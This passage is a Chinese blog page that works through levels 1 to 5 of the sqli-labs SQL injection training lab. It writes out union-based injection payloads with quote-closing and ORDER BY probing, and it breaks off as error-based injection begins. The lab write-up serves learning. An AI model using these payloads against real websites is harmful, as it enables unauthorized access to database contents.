@@ -1,0 +1,969 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>sqli-labs闯关记录 | Jay&#39;s blog</title>
+  <meta name="description" content="#SQLI和sqli-labs介绍  SQLI，sql injection，我们称之为sql注入。何为sql，英文：Structured Query Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS SQL ,Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs闯关记录">
+<meta property="og:url" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="Jay&#39;s blog">
+<meta property="og:description" content="#SQLI和sqli-labs介绍  SQLI，sql injection，我们称之为sql注入。何为sql，英文：Structured Query Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS SQL ,Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/0-1.png">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/0-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/1-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/1-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/1-3.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/1-4.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/1-5.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/1-6.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/2-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/2-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/3-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/3-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/4-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/4-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/4-3.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/5-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/5-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/5-3.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/5-4.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/5-5.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/5-6.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/6-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/6-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/7-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/7-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/7-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/7-3.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/7-4.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/8-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/8-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/9-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/9-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/10-1.png">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/10-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/11-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/11-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/11-3.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/11-4.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/12-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/12-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/12-3.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/13-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/13-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/13-3.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/13-4.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/14-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/14-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/15-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/15-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/15-3.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/16-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/16-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/17-1.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/17-2.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/17-3.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/17-4.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/17-5.jpg">
+<meta property="og:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/17-6.jpg">
+<meta property="article:published_time" content="2020-02-01T10:52:41.000Z">
+<meta property="article:modified_time" content="2020-03-01T12:46:42.410Z">
+<meta property="article:author" content="Jay Dodson">
+<meta property="article:tag" content="sql">
+<meta property="article:tag" content="sqli-labs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/0-1.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://www.jaydodson.top/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Jay&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favi.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/jaydodson" target="_blank">
+          <img class="img-circle img-rotate" src="/images/THE1.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">m0s</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">信安之路。</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Hangzhou, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/jaydodson" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Ubuntu/">Ubuntu</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/">信安之路</a><span class="category-list-count">6</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ubuntu/" rel="tag">Ubuntu</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/" rel="tag">nginx</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php-fpm/" rel="tag">php-fpm</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/" rel="tag">sql</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli-labs/" rel="tag">sqli-labs</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/Ubuntu/" style="font-size: 13.33px;">Ubuntu</a> <a href="/tags/mysql/" style="font-size: 14px;">mysql</a> <a href="/tags/nginx/" style="font-size: 13px;">nginx</a> <a href="/tags/php-fpm/" style="font-size: 13px;">php-fpm</a> <a href="/tags/sql/" style="font-size: 13.67px;">sql</a> <a href="/tags/sqli-labs/" style="font-size: 13px;">sqli-labs</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 13px;">sql注入</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a><span class="archive-list-count">6</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/" class="title">sqli-labs闯关记录</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-02-01T10:52:41.000Z" itemprop="datePublished">2020-02-01</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/">信安之路</a>
+              </p>
+              <p class="item-title">
+                <a href="/2019/09/29/WEB%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0/" class="title">第九周，WEB页面解析的流程学习</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2019-09-29T05:43:43.000Z" itemprop="datePublished">2019-09-29</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/">信安之路</a>
+              </p>
+              <p class="item-title">
+                <a href="/2019/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/" class="title">第六周，数据库相关注入语句的收集和学习</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2019-09-08T04:43:43.000Z" itemprop="datePublished">2019-09-08</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Ubuntu/">Ubuntu</a>
+              </p>
+              <p class="item-title">
+                <a href="/2019/08/27/Ubuntu18-04%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" class="title">Ubuntu18.04网络配置</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2019-08-27T09:26:57.000Z" itemprop="datePublished">2019-08-27</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Ubuntu/">Ubuntu</a>
+              </p>
+              <p class="item-title">
+                <a href="/2019/08/27/Ubuntu18-04%E6%96%B0%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/" class="title">Ubuntu18.04新特性总结</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2019-08-27T09:17:19.000Z" itemprop="datePublished">2019-08-27</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">文章目录</h3>
+      
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-sqli-labs闯关记录" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sqli-labs闯关记录
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/" class="article-date">
+	  <time datetime="2020-02-01T10:52:41.000Z" itemprop="datePublished">2020-02-01</time>
+	</a>
+</span>
+        
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/sql/" rel="tag">sql</a>, <a class="article-tag-link" href="/tags/sqli-labs/" rel="tag">sqli-labs</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <p>#SQLI和sqli-labs介绍</p>
+<blockquote>
+<p>SQLI，sql injection，我们称之为sql注入。何为sql，英文：Structured Query Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS SQL ,Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。</p>
+</blockquote>
+<p>#Sqli-labs下载</p>
+<blockquote>
+<p>Sqli-labs项目地址—Github获取：<code>https://github.com/Audi-1/sqli-labs</code></p>
+</blockquote>
+<p>#Sqli-labs安装</p>
+<ul>
+<li>apache+mysql+php5.x</li>
+<li>我测试用的环境是 Ubuntu18.04</li>
+</ul>
+<blockquote>
+<p>将之前下载的源码解压到web目录下/var/www/html下<br>修改/var/www/html/sqli-labs/sql-connections/db-creds.inc文件中的MySQL账号密码即可</p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/0-1.png" alt></p>
+<p>访问 localhost/sqli-lbs/    ，点击<code>Setup/reset Database for labs</code>    即可创建所需数据库</p>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/0-2.jpg" alt></p>
+<p>##Less-1</p>
+<blockquote>
+<p>访问<code>http://192.168.2.103/sqli-labs/Less-1/</code></p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/1-1.jpg" alt></p>
+<blockquote>
+<p>提示需要输入参数id以及值<br>输入<code>?id=1</code>回显如下信息，发现有返回信息的地方</p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/1-2.jpg" alt></p>
+<blockquote>
+<p>首先使用<code>&#39;</code>判断是否有注入，发现报错，判断是有注入的(肯定啊，毕竟这是练习注入的嘛)，报错信息有三个<code>&#39;</code>,判断id这个参数是用单引号<code>&#39;</code>包住的。</p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/1-3.jpg" alt></p>
+<blockquote>
+<p>于是可以构造语句进行注入，首先将1改为-1，使id参数查不出数据，那么这个数据回显的地方会回显我们想要查的数据，否则将会查id=1的数据并且回显。<br>接着用<code>order by num</code>来查询列数<br>payload为<code>?id=-1&#39; order by 3 -- #</code><br>其中<code>&#39;</code>是为了闭合前面id参数的查询。 <code>--</code>和<code>#</code>均为注释符，个人使用习惯是将两个都加上</p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/1-4.jpg" alt></p>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/1-5.jpg" alt></p>
+<blockquote>
+<p>当order by 3时不报错，4时报错，判断列数为3，接着可以使用联合查询union爆库查需要的东西</p>
+</blockquote>
+<blockquote>
+<p>构造payload<code>?id=-1&#39; union select 1,@@version,user() -- #</code><br>查询MySQL版本，以及用户</p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/1-6.jpg" alt></p>
+<p>##Less-2</p>
+<blockquote>
+<p>先试用<code>&#39;</code>判断是否有注入</p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/2-1.jpg" alt></p>
+<blockquote>
+<p>回显的错误信息里面只有一个<code>&#39;</code>,说明这个单引号是我们自己添加的，可以判断代码里面的查询语句中的id参数是一个数值，并没有引号包住</p>
+</blockquote>
+<blockquote>
+<p>于是我们可以构造payload<code>?id=-1 union select 1,@@version,user() -- #</code>进行注入</p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/2-2.jpg" alt></p>
+<p>##Less-3</p>
+<blockquote>
+<p>老规矩先用<code>&#39;</code>判断</p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/3-1.jpg" alt></p>
+<blockquote>
+<p>发现回显有三个单引号并且有一个右括号，从这可以判断id参数是用单引号和括号包起来的。<br>于是可以构造payload<code>?id=-1&#39;) union select 1,@@version,user() -- #</code>进行注入</p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/3-2.jpg" alt></p>
+<p>##Less-4</p>
+<blockquote>
+<p>老规矩用<code>&#39;</code>进行测试，发现没有用，没有回显错误信息。</p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/4-1.jpg" alt></p>
+<blockquote>
+<p>于是用双引号<code>&quot;</code>进行测试，这会有错误回显了。</p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/4-2.jpg" alt></p>
+<blockquote>
+<p>从回显中可以判断出id参数被双引号和括号一起包着。于是我们可以构造payload<code>?id=-1&quot;) union select 1,@@version,user() -- #</code>进行注入</p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/4-3.jpg" alt></p>
+<p>##Less-5</p>
+<blockquote>
+<p>首先看下id=1的返回值是什么</p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/5-1.jpg" alt></p>
+<blockquote>
+<p>只返回了<code>You are in......</code>,没有数据回显的地方<br>接着我们用<code>&#39;</code>测试</p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/5-2.jpg" alt></p>
+<blockquote>
+<p>这里返回了报错的信息，发现有三个单引号,这里可以判断id参数是用单引号包起来的。于是用payload<code>?id=-1&#39; union select 1,@@version,user() -- #</code>进行注入</p>
+</blockquote>
+<p><img src="/2020/02/01/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/5-3.jpg" alt></p>
+<blockquote>
+<p>返回的结果是<code>You are in......</code>，原因就是第一步中的，这个页面没有任何回显的地方，无法用联合查询的方式获取信息。<br>emmmmmm 这里应该是报错注入。</p>
+</blockquote>
+<blockquote>
+<p>于是构造构造payload用updatexml()函数进行报错注入</p>
+</blockquote>
